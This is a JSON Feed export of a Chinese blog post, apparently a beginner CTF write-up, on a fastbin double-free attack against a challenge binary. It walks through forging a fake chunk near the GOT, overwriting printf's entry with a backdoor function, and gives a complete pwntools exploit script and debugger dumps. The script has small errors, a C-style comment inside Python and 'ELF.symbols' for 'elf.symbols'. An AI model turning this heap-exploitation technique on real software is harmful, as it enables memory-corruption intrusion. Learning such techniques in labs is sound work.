{
    "version": "https://jsonfeed.org/version/1",
    "title": "唐仔橙 • All posts by \"堆\" tag",
    "description": "喜欢探索世界,在读研究生,计算机爱好者的成长记录",
    "home_page_url": "https://tangzichengcc.github.io",
    "items": [
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/",
            "title": "pwn入门-17-堆入门之fasbinattack",
            "date_published": "2023-03-07T06:54:38.000Z",
            "content_html": "<p>xuanxuan : <a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/</a></p>\n<h1 id=\"Write-Some-Paper\"><a href=\"#Write-Some-Paper\" class=\"headerlink\" title=\"Write_Some_Paper\"></a>Write_Some_Paper</h1><p>申请不同的编号有影响吗????</p>\n<h2 id=\"怎么getshell呢\"><a href=\"#怎么getshell呢\" class=\"headerlink\" title=\"怎么getshell呢?\"></a>怎么getshell呢?</h2><p>​\t\t首先是获取任意或者受限制的地址读写的能力,然后修改关键函数等,比如修改got表,把函数地址替换成system或者后门函数地址,然后再执行的时候就getshell了</p>\n<h2 id=\"怎么实现地址写\"><a href=\"#怎么实现地址写\" class=\"headerlink\" title=\"怎么实现地址写?\"></a>怎么实现地址写?</h2><p>​\t\t利用double free,可以操控堆块的fd,从而实现把任意地址当作bin来进行申请空间,这样就获得了该地址的读写能力</p>\n<h2 id=\"double-free\"><a href=\"#double-free\" class=\"headerlink\" title=\"double free\"></a>double free</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>) </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)  <span class=\"comment\">//double free了</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">40</span>,p64(<span class=\"number\">0x60203a</span>))<span class=\"comment\">//这个需要填入覆盖地址了</span></span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)  <span class=\"comment\">// 这一步后,会把fd(p64(0x60203a)) 放到fastbin的头部,下一次会申请到这里</span></span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(ELF.symbols[<span class=\"string\">&#x27;gg&#x27;</span>])) <span class=\"comment\">//此时申请的就是第一次add时填入的fd地址\t\t</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"申请堆块时的地址约束\"><a href=\"#申请堆块时的地址约束\" class=\"headerlink\" title=\"申请堆块时的地址约束\"></a>申请堆块时的地址约束</h2><p>​\t\t即size字段需要是fastbin这个链的大小，即目标地址的前8个字节需要满足，64位下这8个字节只要低4个字节满足就可以了。所以通过这种方式，我们可以控制的内存是需要满足一定约束的内存。也可以称这种满足要求的内存部分为伪堆块。获得这种内存有两种方式：</p>\n<ol>\n<li>寻找是否有天然满足伪堆块的约束的内存</li>\n<li>想办法构造伪堆块</li>\n</ol>\n<p>8字节prev_size 随意 , <font color=\"red\">8字节size(64位下前4字节满足大小,如0x40大小)</font>,要覆盖的fd(要修改的内存地址)</p>\n<p>要找到覆盖的函数,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">16</span>gx <span class=\"number\">0x602000</span></span><br><span class=\"line\"><span class=\"number\">0x602000</span>:\t<span class=\"number\">0x0000000000601e28</span>\t<span class=\"number\">0x00007ffff7ffe168</span></span><br><span class=\"line\"><span class=\"number\">0x602010</span>:\t<span class=\"number\">0x00007ffff7dee0b0</span>\t<span class=\"number\">0x00007ffff7a91a70</span></span><br><span class=\"line\"><span class=\"number\">0x602020</span>:\t<span class=\"number\">0x00007ffff7a7d5d0</span>\t<span class=\"number\">0x00007ffff7a7c0e0</span></span><br><span class=\"line\"><span class=\"number\">0x602030</span>:\t<span class=\"number\">0x0000000000400746</span>\t<span class=\"number\">0x0000000000400756</span></span><br><span class=\"line\"><span class=\"number\">0x602040</span>:\t<span class=\"number\">0x00007ffff7a637b0</span>\t<span class=\"number\">0x00007ffff7a2e740</span></span><br><span class=\"line\"><span class=\"number\">0x602050</span>:\t<span class=\"number\">0x0000000000400786</span>\t<span class=\"number\">0x00007ffff7a493b0</span></span><br><span class=\"line\"><span class=\"number\">0x602060</span>:\t<span class=\"number\">0x00007ffff7a91550</span>\t<span class=\"number\">0x00007ffff7a7ddb0</span></span><br><span class=\"line\"><span class=\"number\">0x602070</span>:\t<span class=\"number\">0x00007ffff7a79480</span>\t<span class=\"number\">0x00000000004007d6</span></span><br></pre></td></tr></table></figure>\n\n<p>这几个地方都可以作为size</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230307155602238.png\" alt=\"image-20230307155602238\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x602000</span>:\t<span class=\"number\">0x28</span>\t<span class=\"number\">0x1e</span>\t<span class=\"number\">0x60</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602008</span>:\t<span class=\"number\">0x68</span>\t<span class=\"number\">0xe1</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602010</span>:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0xe0</span>\t<span class=\"number\">0xde</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602018</span> &lt;<span class=\"built_in\">free</span>@got.plt&gt;:\t<span class=\"number\">0x70</span>\t<span class=\"number\">0x1a</span>\t<span class=\"number\">0xa9</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602020</span> &lt;<span class=\"built_in\">puts</span>@got.plt&gt;:\t<span class=\"number\">0xd0</span>\t<span class=\"number\">0xd5</span>\t<span class=\"number\">0xa7</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602028</span> &lt;fread@got.plt&gt;:\t<span class=\"number\">0xe0</span>\t<span class=\"number\">0xc0</span>\t<span class=\"number\">0xa7</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602030</span> &lt;__stack_chk_fail@got.plt&gt;:\t<span class=\"number\">0x46</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602038</span> &lt;system@got.plt&gt;:\t<span class=\"number\">0x56</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602040</span> &lt;<span class=\"built_in\">printf</span>@got.plt&gt;:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0x37</span>\t<span class=\"number\">0xa6</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602048</span> &lt;__libc_start_main@got.plt&gt;:\t<span class=\"number\">0x40</span>\t<span class=\"number\">0xe7</span>\t<span class=\"number\">0xa2</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602050</span> &lt;__gmon_start__@got.plt&gt;:\t<span class=\"number\">0x86</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602058</span> &lt;strtol@got.plt&gt;:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0x93</span>\t<span class=\"number\">0xa4</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602060</span> &lt;<span class=\"built_in\">malloc</span>@got.plt&gt;:\t<span class=\"number\">0x50</span>\t<span class=\"number\">0x15</span>\t<span class=\"number\">0xa9</span>\t<span class=\"number\">0xf7</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t<font color=\"red\">根据这个来选择申请的堆块的大小</font></p>\n<p>​\t\t注意大小端的问题,这里选取这里作为伪造的chunk的size,然后后面是可控的数据,注意不要把system破坏了,然后把printf修改成后们地址即可</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230411214141077.png\" alt=\"image-20230411214141077\">\t</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./paper&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./paper&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">num,length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete paper&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;(0-9):&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;enter&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete paper&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;(0-9):&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>) </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">40</span>,p64(<span class=\"number\">0x60203a</span>))//这个需要填入覆盖地址了</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(ELF.symbols[<span class=\"string\">&#x27;gg&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#io.recv(1024)</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
            "tags": [
                "PWN入门",
                "堆"
            ]
        }
    ]
}